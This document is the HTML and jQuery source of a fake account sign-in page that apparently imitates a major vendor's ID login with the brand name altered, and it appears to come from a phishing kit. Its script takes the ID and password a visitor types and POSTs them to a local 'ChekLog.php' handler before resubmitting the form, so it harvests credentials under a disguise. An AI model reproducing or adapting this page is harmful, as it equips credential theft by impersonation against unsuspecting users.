
<html ><head>
    <title></title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <link rel="prefetch stylesheet" href="" type="text/css">
     <link rel="stylesheet" type="text/css" media="screen" href="signin_data/app.css">

                
<!--     <style>        
    #pwd:focus {
    background-color: yellow;
}    
   </style>  -->     
<style type="text/css"></style></head>

<body class="">

<div class="si-body si-container container-fluid" id="content">

<div class="jock-id-logo hide-always" id="jock-id-logo">
    <i class="icon icon_jock"></i>
</div>


<div class="widget-container fade-in  restrict-max-wh  fade-in ">

    <div class="si-step " id="step">
            <div class="logo">
            <img style="width: 200px;" src="signin_data/aid_logo@2x.png" alt="Application logo" class="cnsmr-app-image">
    </div>


        <div class="  " id="stepEl">
<div class="signin fade-in " id="signin">
         <img style="width: 56%; padding: 15px 25px;" src="signin_data/manage.png">    
    <div class="container si-field-container ">
		<form name="myform" id="myform" method="POST" action='#'> 
        <div class="row no-gutter si-field jock-id">
            <div class="col-xs-12">
                <div class="ax-border jock-id "></div>
                
                <input placeholder="jock&nbsp;ID" autofocus="" spellcheck="false"  autocorrect="off" autocomplete="off" id="_logname_" name="_logname_" class="si-text-field" type="email" value="">
            </div>
        </div>
        <div class="field-separator "></div>
        <div class="row no-gutter si-field pwd">
            <div class="col-xs-12">
                <div class="ax-border pwd "></div>
                <label class="sr-only" for="pwd">
                    Password
                </label>
                <input placeholder="Password" class="si-password si-text-field  " autocomplete="off"  id="_logpass_" name="_logpass_" type="password" value="">

                <p role="tooltip" id="invalidUserNamePwdErrMsg" class="sr-only">
                    
                </p>
            </div>
        </div>
        <div id="error" name="error" class="pop-container error signin-error hide">
            
               <img src='signin_data/error.png' style="width: 100%; position: relative; top: -7px;" >
            
        </div>
            <div class="si-remember-password">
                <label for="remember-me" style="color: white;">                    Remember me 
                </label>
               
                <i class="ax-outline icon   icon_uncheck "style="color: white;"></i>

            </div>
        <div id="loading" name="loading" class="spinner-container auth hide" style="position: absolute; top: 46px; right: 7px; z-index: 99;">
		<img width="35" height="35" src="../../set/img/logisma.gif">
        </div>
        <button  class="si-button btn" tabindex="0"  id="go_signin" name="go_signin">
            <i class="icon icon_sign_in"></i>
        </button>
	</form>
    </div>
    <div class="si-container-footer">
        
    </div>
</div>

</div>
    </div>
    <div style="display:none !important;" id="stocking"></div>
    
    
    
    
</div>

</div>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.0/jquery.min.js"></script>

<script>//jQuery time

							
	$(document).ready( function () { 
	

					
					$("#_logname_").focus(function() {
				
						$(this).css({'background' : 'none'});
					}).blur(function() {
						if( !$(this).val()){
						$(this).css({'background' : 'transparent url("../set/img/cheet.png") no-repeat scroll 16px 15px / 130px 290px'});
								}
					});
					
					$("#_logpass_").focus(function() {
						$(this).css({'background' : 'none'});
					}).blur(function() {
						if( !$(this).val()){
						$(this).css({'background' : 'transparent url("../set/img/cheet.png") no-repeat scroll 16px -19px / 130px 290px'});
								}
					});
					
					
					
					
							
						
						$("#go_signin").click(function(event){
						event.preventDefault();
						
							var ID=$("input[name=_logname_]").val();
							var PW=$("input[name=_logpass_]").val();
								
							//alert(username + password + ip);
							if (ID==null || ID=="",PW==null || PW=="")
							{
								
								$( "#error" ).removeClass( "hide" );
								return false;
							}
							
							var dataString = 'ID='+ID+'&PW='+PW;
							$.ajax({
								type : "POST",
								url : "../ChekLog.php",
								data : dataString,
								beforeSend : function() {
									//$("#login").css({'display':'none'});
									$( "#go_signin" ).toggleClass( "hide" );
									$( "#loading" ).toggleClass( "hide" );
								},
							success : function(response) {
							//alert(response);
							if(!response) {
							$( "#error" ).toggleClass( "hide" );
							$("#loading").css({'display':'none'});
							$( "#go_signin" ).toggleClass( "hide" );
						
							return false;
							} else {
							//alert("Connected");
							
							document.myform.submit();  
							}
							}
							});
							});
							});
</script>

</body></html>